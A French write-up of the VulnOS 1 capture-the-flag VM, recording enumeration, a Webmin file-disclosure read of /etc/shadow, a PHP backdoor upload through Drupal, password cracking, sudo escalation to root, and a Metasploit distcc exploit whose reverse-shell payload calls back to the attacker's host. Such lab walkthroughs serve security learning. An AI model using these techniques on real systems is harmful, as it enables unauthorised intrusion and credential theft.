# Solution du CTF VulnOS 1

Présentation
------------

[VulnOS 1](http://vulnhub.com/entry/vulnos-1,60/) est une VM de CTF disponible sur VulnHub dont l'auteur indique qu'elle est bien plombée question vulnérabilités.  

L'objectif : passer root et trouver toutes les vulnérabilités (ça promet).  

Mise en place
-------------

On dispose d'un VDI ainsi que d'un fichier VBOX qui correspond sans doute à un ancien format de VirtualBox (je dis ça car VirtualBox ne m'a pas proposé pas la lecture de ce type de fichier).  

On crée donc une machine virtuelle en spécifiant le VDI comme disque existant. Mais lors d'une recherche Nmap pas de VM !  

Ce sont les petits caprices d'udev (pour ceux qui travaillent régulièrement avecd es VMs), heureusement on retrouve l'adresse MAC originale dans le fichier VBOX (080027430619) et en l'appliquant sur la VM que l'on relance elle parvient finalement à récupérer une adresse IP.  

Too much
--------

Il y a énormément de services qui tournent sur la machine (si vous voyez "snip" c'est que j'ai réduit l'output) :  

```plain
Starting Nmap 6.46 ( http://nmap.org ) at 2014-05-26 13:28 CEST
Nmap scan report for 192.168.1.29
Host is up (0.00021s latency).
Not shown: 977 closed ports
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 43:a6:84:8d:be:1a:ee:fb:ed:c3:23:53:14:14:8f:50 (DSA)
|_  2048 30:1d:2d:c4:9e:66:d8:bd:70:7c:48:84:fb:b9:7b:09 (RSA)
23/tcp    open  telnet      Linux telnetd
25/tcp    open  smtp        Postfix smtpd
|_smtp-commands: VulnOS.home, PIPELINING, SIZE 10240000, VRFY, (...snip...)
| ssl-cert: Subject: commonName=VulnOS.home
| Not valid before: 2014-03-09T14:00:56+00:00
|_Not valid after:  2024-03-06T14:00:56+00:00
|_ssl-date: 2014-05-26T11:28:30+00:00; 0s from local time.
53/tcp    open  domain      ISC BIND 9.7.0-P1
| dns-nsid: 
|_  bind.version: 9.7.0-P1
80/tcp    open  http        Apache httpd 2.2.14 ((Ubuntu))
|_http-title: index
110/tcp   open  pop3        Dovecot pop3d
|_pop3-capabilities: SASL TOP UIDL RESP-CODES PIPELINING STLS CAPA
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      33573/tcp  mountd
|   100005  1,2,3      47164/udp  mountd
|   100021  1,3,4      42228/udp  nlockmgr
|   100021  1,3,4      47017/tcp  nlockmgr
|   100024  1          40111/tcp  status
|_  100024  1          47290/udp  status
139/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
143/tcp   open  imap        Dovecot imapd
|_imap-capabilities: LIST-EXTENDED completed UIDPLUS MULTIAPPEND (...snip...)
389/tcp   open  ldap        OpenLDAP 2.2.X - 2.3.X
445/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
512/tcp   open  exec        netkit-rsh rexecd
513/tcp   open  login
514/tcp   open  tcpwrapped
901/tcp   open  http        Samba SWAT administration server
| http-auth: 
| HTTP/1.0 401 Authorization Required
|_  Basic realm=SWAT
|_http-title: 401 Authorization Required
993/tcp   open  ssl/imap    Dovecot imapd
|_imap-capabilities: LIST-EXTENDED completed UIDPLUS MULTIAPPEND (...snip...)
| ssl-cert: Subject: commonName=VulnOS.home
| Not valid before: 2014-03-09T14:00:56+00:00
|_Not valid after:  2024-03-06T14:00:56+00:00
|_ssl-date: 2014-05-26T11:28:30+00:00; -1s from local time.
| sslv2: 
|   SSLv2 supported
|_  ciphers: none
995/tcp   open  ssl/pop3    Dovecot pop3d
|_pop3-capabilities: UIDL TOP USER RESP-CODES PIPELINING SASL(PLAIN LOGIN) CAPA
| ssl-cert: Subject: commonName=VulnOS.home
| Not valid before: 2014-03-09T14:00:56+00:00
|_Not valid after:  2024-03-06T14:00:56+00:00
|_ssl-date: 2014-05-26T11:28:30+00:00; 0s from local time.
| sslv2: 
|   SSLv2 supported
|_  ciphers: none
2000/tcp  open  sieve       Dovecot timsieved
2049/tcp  open  nfs         2-4 (RPC #100003)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100003  2,3,4       2049/tcp  nfs
|   100003  2,3,4       2049/udp  nfs
|   100005  1,2,3      33573/tcp  mountd
|   100005  1,2,3      47164/udp  mountd
|   100021  1,3,4      42228/udp  nlockmgr
|   100021  1,3,4      47017/tcp  nlockmgr
|   100024  1          40111/tcp  status
|_  100024  1          47290/udp  status
3306/tcp  open  mysql       MySQL 5.1.73-0ubuntu0.10.04.1
| mysql-info: 
|   Protocol: 53
|   Version: .1.73-0ubuntu0.10.04.1
|   Thread ID: 311
|   Capabilities flags: 63487
|   Some Capabilities: ConnectWithDatabase, Speaks41ProtocolNew, (...snip...)
|   Status: Autocommit
|_  Salt: BXvk4_aK3[SoS18h$vHF
6667/tcp  open  irc         IRCnet ircd
| irc-info: 
|   server: irc.localhost
|   version: 2.11.2p1. irc.localhost 000A 
|   servers: 1
|   chans: 15
|   users: 1
|   lservers: 0
|   lusers: 1
|   uptime: 0 days, 0:00:58
|   source host: 192.168.1.3
|_  source ident: NONE or BLOCKED
8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods: Potentially risky methods: PUT DELETE
|_See http://nmap.org/nsedoc/scripts/http-methods.html
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
| ndmp-version: 
|_  ERROR: Failed to get host information from server
MAC Address: 08:00:27:43:06:19 (Cadmus Computer Systems)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.32
Network Distance: 1 hop
Service Info: Hosts:  VulnOS.home, irc.localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: VULNOS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```

On se dit *"super, on va jouer un peu avec NFS !"* sauf que quand on appelle showmount il n'y a aucun partage exporté :'(  

SNMP est quand à lui plus bavard. La chaine de communauté a été laissée à public. Le module snmp\_enum de Metasploit donne énormément d'informations notamment les processus qui tournent, l'espace disque sur les partitions, les interfaces réseau, ports en écoute ou connectés et les processus :  

```plain
msf auxiliary(snmp_enum) > exploit

[+] 192.168.1.29, Connected.

[*] System information:

Host IP                       : 192.168.1.29
Hostname                      : VulnOS
Description                   : Linux VulnOS 2.6.32-57-generic-pae #119-Ubuntu SMP Wed Feb 19 01:20:04 UTC 2014 i686
Contact                       : vulnosadmin@VulnOS
Location                      : "VulnOS"
Uptime snmp                   : 2 days, 21:05:10.59
Uptime system                 : 2 days, 21:05:02.71
System date                   : 2014-5-29 10:32:42.0

(...snip : bien trop long...)
```

Du côté de SMB on obtient certaines informations qui malheureusement ne nous serviront peu (une attaque bruteforce via Hydra n'a permis de récupérer aucun account) :  

```plain
msf auxiliary(smb_enumshares) > exploit

[*] 192.168.1.29:139 - Unix Samba 3.4.7 (Unknown)
[+] 192.168.1.29:  print$ - (DISK) Printer Drivers
[+] 192.168.1.29:  IPC$ - (IPC) IPC Service (VulnOS server (Samba
[+] Ubuntu))
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf auxiliary(smb_enumusers) > exploit

[*] 192.168.1.29 VULNOS [ stupiduser, ftp, nobody, sysadmin, vulnosadmin, webmin, hackme, sa ] ( LockoutTries=0 PasswordMin=5 )
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Côté serveur web il y a là aussi énormément d'applis (trouvées via dirb) :  

```plain
---- Scanning URL: http://192.168.1.29/ ----
+ http://192.168.1.29/.htaccess (CODE:200|SIZE:501)
+ http://192.168.1.29/cgi-bin/ (CODE:403|SIZE:288)
==> DIRECTORY: http://192.168.1.29/drupal6/
==> DIRECTORY: http://192.168.1.29/egroupware/
==> DIRECTORY: http://192.168.1.29/imgs/
+ http://192.168.1.29/index (CODE:200|SIZE:745)
+ http://192.168.1.29/index2 (CODE:200|SIZE:1066)
==> DIRECTORY: http://192.168.1.29/javascript/
==> DIRECTORY: http://192.168.1.29/mediawiki/
==> DIRECTORY: http://192.168.1.29/phpgroupware/
==> DIRECTORY: http://192.168.1.29/phpldapadmin/
==> DIRECTORY: http://192.168.1.29/phpmyadmin/
==> DIRECTORY: http://192.168.1.29/phppgadmin/
==> DIRECTORY: http://192.168.1.29/phpsysinfo/
+ http://192.168.1.29/server-status (CODE:403|SIZE:293)
```

Quand on arrive sur le Drupal, d'autres liens nous sont encore donnés comme un DVWA, un dolibarr, mutillidae etc..  

J'ai décidé de bouder les applications volontairement vulnérables qui donnent peu d'intérêt pédagogique.  

Un pied dans la porte
---------------------

Du côté du Webmin ce dernier est vulnérable au module *file\_disclosure* de *Metasploit*, on peut ainsi récupérer le /etc/shadow :  

```plain
root:*:16137:0:99999:7:::
(...snip...)
vulnosadmin:$6$SLXu95CH$pVAdp447R4MEFKtHrWcDV7WIBuiP2Yp0NJTVPyg37K9U11SFuLena8p.xbnSVJFAeg1WO28ljNAPrlXaghLmo/:16137:0:99999:7:::
sysadmin:admin:16137:0:99999:7:::
webmin:webmin:16137:0:99999:7:::
hackme:hackme:16137:0:99999:7:::
sa:password1:16137:0:99999:7:::
stupiduser:stupiduser:16137:0:99999:7:::
messagebus:*:16137:0:99999:7:::
distccd:*:16137:0:99999:7:::
sshd:*:16138:0:99999:7:::
openldap:!:16138:0:99999:7:::
ftp:!:16138:0:99999:7:::
mysql:!:16138:0:99999:7:::
telnetd:*:16138:0:99999:7:::
bind:*:16138:0:99999:7:::
postgres:*:16138:0:99999:7:::
postfix:*:16138:0:99999:7:::
dovecot:*:16138:0:99999:7:::
tomcat6:*:16138:0:99999:7:::
statd:*:16138:0:99999:7:::
snmp:*:16138:0:99999:7:::
nagios:!:16140:0:99999:7:::
openerp:*:16140:0:99999:7:::
```

Il y a des mots de passe en clair dans shadow mais si on tente de se connecter, force est de constater que ça ne marche pas, idem depuis l'interface Webmin... Je ne sais pas ce que l'auteur du challenge avait en tête.  

Je décide de m'intéresser à la configuration d'Apache en lisant les fichiers de configurations (/etc/apache2/apache2.conf, /etc/apache2/sites-available/default) via la même faille.  

Sur le second fichier on trouve le DocumentRoot (/var/www) et le ScriptAlias (qui pointe vers /usr/lib/cgi-bin/).  

J'essaie de trouver le fichier de configuration de Drupal mais ce dernier ne semble pas installé au même endroit. Heureusement si on passe un fichier inexistant on a une erreur qui nous révèle son PATH : *The requested URL /usr/share/drupal6/index.php was not found on this server.*  

Je peux accèder ainsi à /usr/share/drupal6/sites/default/dbconfig.php :  

```plain
$dbuser='drupal6';
$dbpass='toor';
$basepath='';
$dbname='drupal6';
$dbserver='';
$dbport='';
$dbtype='mysql';
```

Bofbof...  

Qu'est-ce qu'il y a dans la config de dolibar (*/var/www/dolibarr-3.0.0/htdocs/conf/conf.php*) ?  

```plain
$dolibarr_main_db_host='0.0.0.0';
$dolibarr_main_db_port='';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_user='root';
$dolibarr_main_db_pass='toor';
$dolibarr_main_db_type='mysqli';
```

C'est mieux. Je me connecte sur /phpmyadmin/ avec ces identifiants et j'essaye d'utiliser *INTO OUTFILE* pour placer une backdoor PHP mais sans succès :(  

Dans la base de données pour le drupal6 je trouve un user drupal6 avec le hash ab57944b510148c7299a13f6cb31ef6e. Une recherche Google nous donne le password correspondant : drupal6 :p  

J'édite un des posts existant pour ajouter ma backdoor PHP en attachement mais celle-ci est renommée en .php.txt :(  

Dans *Administer > Site configuration > Files uploads* j'ai pu ajouter le type phtml puis finalement uploader la backdoor (drupal l'a placée dans */drupal6/sites/default/files/*).  

Netcat est installé sur le système mais ne dispose pas de l'option -e pour y attacher un shell.  

Sur le blog Pentest du SANS j'ai trouvé [un article qui permet de résoudre ce problème via l'utilisation de mknod](http://pen-testing.sans.org/blog/pen-testing/2013/05/06/netcat-without-e-no-problem).  

Un upload de tshd plus tard...  

```plain
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ uname -a
Linux VulnOS 2.6.32-57-generic-pae #119-Ubuntu SMP Wed Feb 19 01:20:04 UTC 2014 i686 GNU/Linux
```

C'est bien joli mais ça ne nous donne pas un accès root. Le kernel 2.6.32 semble résister aux différents exploits que j'ai pu tester et les services qui tournent en root ne semblent pas plus vulnérables :(  

J'ai donc continué à fouiller dans les fichiers via la faille webmin ou mon accès shell. Finalement j'ai repéré un pattern dans les mots de passe d'abord avec le password Nagios que j'ai pu casser :  

```plain
$ cat /etc/nagios3/htpasswd.users
nagiosadmin:8A86JOBWoCwnk

$ /opt/jtr/john nagios
Loaded 1 password hash (Traditional DES [128/128 BS AVX-16])
canuhack         (nagiosadmin)
guesses: 1  time: 0:05:03:52 DONE (Thu May 29 03:59:22 2014)  c/s: 4605K  trying: canup1or - canuhaci
```

Puis via le contenu du fichier */etc/ldap.secret* : canuhackme  

J'ai créé une wordlist en me basant sur les noms d'utilisateurs récupérés + les mots de passe + des versions préfixées de canu et j'ai lancé JtR sur le fichier shadow :  

```plain
$ /opt/jtr/john --wordlist=passwords.txt --rules shadow
Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Loaded 1 password hash (sha512crypt [64/64])
canuhackme       (vulnosadmin)
guesses: 1  time: 0:00:00:00 DONE (Thu May 29 09:13:23 2014)  c/s: 175  trying: canuhackme
```

On peut se connecter à SSH via cet account puis passer root via sudo car il est privilégié :  

```plain
$ ssh vulnosadmin@192.168.1.29
vulnosadmin@192.168.1.29's password: 
Linux VulnOS 2.6.32-57-generic-pae #119-Ubuntu SMP Wed Feb 19 01:20:04 UTC 2014 i686 GNU/Linux
Ubuntu 10.04.4 LTS
(...snip...)
vulnosadmin@VulnOS:~$ id
uid=1000(vulnosadmin) gid=1000(vulnosadmin) groepen=4(adm),20(dialout),24(cdrom),
46(plugdev),109(lpadmin),110(sambashare),111(admin),1000(vulnosadmin)
vulnosadmin@VulnOS:~$ sudo -l
[sudo] password for vulnosadmin: 
Matching Defaults entries for vulnosadmin on this host:
    env_reset

User vulnosadmin may run the following commands on this host:
    (ALL) ALL

vulnosadmin@VulnOS:~$ sudo su
root@VulnOS:/home/vulnosadmin# id
uid=0(root) gid=0(root) groepen=0(root)
root@VulnOS:/home/vulnosadmin# cd /root/
root@VulnOS:~# ls
hello.txt
root@VulnOS:~# cat hello.txt 
Hello,

So you got root... You still need to find the rest of the vulnerabilities inside the OS !

TRY HARDER !!!!!!!
```

Pwned  

Cadeau bonux
------------

Alternativement il est possible d'exploiter le distcc (un serveur de compilation) présent sur le système :  

```plain
msf exploit(distcc_exec) > show options

Module options (exploit/unix/misc/distcc_exec):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  192.168.1.29     yes       The target address
   RPORT  3632             yes       The target port

Payload options (cmd/unix/reverse_ruby):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.3      yes       The listen address
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

msf exploit(distcc_exec) > exploit

[*] Started reverse handler on 192.168.1.3:4444 
[*] Command shell session 1 opened (192.168.1.3:4444 -> 192.168.1.29:49089) at 2014-05-29 10:08:28 +0200

id
uid=104(distccd) gid=65534(nogroup) groups=65534(nogroup)
```

Conclusion
----------

Le challenge offrait peu d'intérêt et se résume à l'exploitation de failles connues et la réutilisation de mots de passe.  

L'auteur du CTF a visiblement installé le plus de services et de webapps possible en se disant que les participants parviendraient bien à se débrouiller avec ça...  

Ainsi dans la racine web on trouvé les dossiers suivants :  

```plain
dolibarr-3.0.0
egroupware
mutillidae
phpsysinfo
redmine-0.9.6
webERP
DVWA-1.0.8
Hackademic_Challenges[EN]
insecure
openclinic
postfixadmin-2.3.1
tikiwiki-1.7.9
webmin-1.280
```

et d'après l'historique bash de l'utilisateur *vulnosadmin* il a aussi tenté d'installer sans succès vsftpd, finger, UnrealIRCd, MoinMoin, Wordpress, SquirrelMail, Wevely, Skybluecanvas et OpenHospital.  

Certaines des applis installées (OpenClinic, tikiwiki) n'ont pas de base de données créées quand aux autres les tables sont souvent vides...

*Published May 29 2014 at 11:51*